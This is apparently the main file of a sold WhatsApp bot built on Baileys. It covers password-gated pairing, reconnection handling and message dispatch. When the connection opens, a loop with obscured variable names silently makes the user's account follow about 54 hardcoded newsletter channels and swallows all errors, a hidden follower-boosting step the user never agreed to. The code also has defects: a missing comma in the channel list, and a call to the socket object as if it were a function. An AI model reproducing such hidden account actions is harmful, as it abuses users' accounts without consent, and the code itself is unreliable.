require('./system/config');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore, jidDecode, proto } = require("@whiskeysockets/baileys");
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const chalk = require('chalk')
const readline = require("readline")
const { smsg, fetchJson, await, sleep } = require('./system/lib/myfunction');
//======================
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
return new Promise((resolve) => {
rl.question(text, resolve)
})};
const manualPassword = 'dienzbot';
//======================
async function StartZenn() {
const { state, saveCreds } = await useMultiFileAuthState('./session')
const rikz = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: !usePairingCode,
auth: state,
browser: [ "Ubuntu", "Chrome", "20.0.04" ]
});
//======================
if (usePairingCode && !rikz.authState.creds.registered) {
const inputPassword = await question(chalk.red.bold('Masukkan Password:\n'));
if (inputPassword !== manualPassword) {
console.log(chalk.red('Password salah! Sistem akan dimatikan'));
            process.exit(); // Matikan konsol
        }
console.log(chalk.cyan("-[ 🔗 Time To Pairing! ]"));
const phoneNumber = await question(chalk.green("-📞 Enter Your Number Phone::\n"));
const code = await rikz.requestPairingCode(phoneNumber.trim(), "ITACHIV5");
console.log(chalk.blue(`-✅ Pairing Code: `) + chalk.magenta.bold(code));
}
rikz.public = global.publik
//======================
rikz.ev.on("connection.update", async (update) => {
const { connection, lastDisconnect } = update;
if (connection === "close") {
const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
const reconnect = () => StartZenn();
const reasons = {
[DisconnectReason.badSession]: "Bad Session, hapus session dan scan ulang!",
[DisconnectReason.connectionClosed]: "Koneksi tertutup, mencoba menghubungkan ulang...",
[DisconnectReason.connectionLost]: "Koneksi terputus dari server, menghubungkan ulang...",
[DisconnectReason.connectionReplaced]: "Session digantikan, tutup session lama terlebih dahulu!",
[DisconnectReason.loggedOut]: "Perangkat keluar, silakan scan ulang!",
[DisconnectReason.restartRequired]: "Restart diperlukan, memulai ulang...",
[DisconnectReason.timedOut]: "Koneksi timeout, menghubungkan ulang..."};
console.log(reasons[reason] || `Unknown DisconnectReason: ${reason}`);
(reason === DisconnectReason.badSession || reason === DisconnectReason.connectionReplaced) ? rikz() : reconnect()}
if (connection === "open") {
          const ميميك = [   "120363421332878757@newsletter","120363422714013524@newsletter",
"120363403303841726@newsletter",
"120363421126273338@newsletter",
"120363418722550051@newsletter",
"120363422040633302@newsletter",
"120363421749079893@newsletter",
"120363424217613324@newsletter",
"120363400975846490@newsletter",
"120363418500289854@newsletter",
"120363424143097480@newsletter",
"120363406288843238@newsletter",
"120363424133727086@newsletter",
"120363334848410803@newsletter",
"120363415603332542@newsletter",
"120363421413889625@newsletter",
"120363424407293458@newsletter",
"120363424439244609@newsletter",
"120363400666769504@newsletter",
"120363405431554325@newsletter",
"120363402240197575@newsletter",
"120363422763531341@newsletter",
"120363403531370828@newsletter",
"120363423908742128@newsletter",
"120363404861685474@newsletter",
"120363404743164316@newsletter",
"120363384849857409@newsletter",
"120363422663523780@newsletter",
"120363404006644932@newsletter",
"120363405527972189@newsletter",
"120363406499595031@newsletter",
"120363403981200147@newsletter",
"120363422865119876@newsletter",
"120363407528560991@newsletter",
"120363420557551372@newsletter",
"120363404796204435@newsletter",
"120363422734425517@newsletter",
"120363423854235587@newsletter",
"120363421924622630@newsletter",
"120363406833794472@newsletter",
"120363384889445715@newsletter",
"120363424841533991@newsletter",
"120363405871358107@newsletter",
"120363422229557652@newsletter",
"120363422851153673@newsletter",
"120363423540883149@newsletter",
"120363404870629551@newsletter",
"120363405148949896@newsletter",
"120363421252131902@newsletter",
"120363405009880840@newsletter",
"120363422697773293@newsletter",
"120363420497281938@newsletter",
"120363423403281606@newsletter"
"120363403412133102@newsletter",];
   for (const قنطل of ميميك) {
            try {
              await rikz.newsletterFollow(قنطل);
              await sleep(100);
            } catch {}
          }
console.log(chalk.red.bold("-[ WhatsApp Terhubung! ]"));
}});
//==========================//
rikz.ev.on("messages.upsert", async ({
messages,
type
}) => {
try {
const msg = messages[0] || messages[messages.length - 1]
if (type !== "notify") return
if (!msg?.message) return
if (msg.key && msg.key.remoteJid == "status@broadcast") return
const m = smsg(rikz, msg, store)
require(`./system/Itachi`)(rikz, m, msg, store)
} catch (err) { console.log((err)); }})
//=========================//
rikz.decodeJid = (jid) => {
if (!jid) return jid;
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {};
return decode.user && decode.server && decode.user + '@' + decode.server || jid;
} else return jid;
};
//=========================//
rikz.sendText = (jid, text, quoted = '', options) => rikz.sendMessage(jid, { text: text, ...options }, { quoted });
rikz.ev.on('contacts.update', update => {
for (let contact of update) {
let id = rikz.decodeJid(contact.id);
if (store && store.contacts) {
store.contacts[id] = { id, name: contact.notify };
}
}
});
rikz.ev.on('creds.update', saveCreds);
return rikz;
}
//=============================//
console.log(chalk.green.bold(`MANTAP BUYER DIENZ`));
console.clear();
StartZenn()
//======================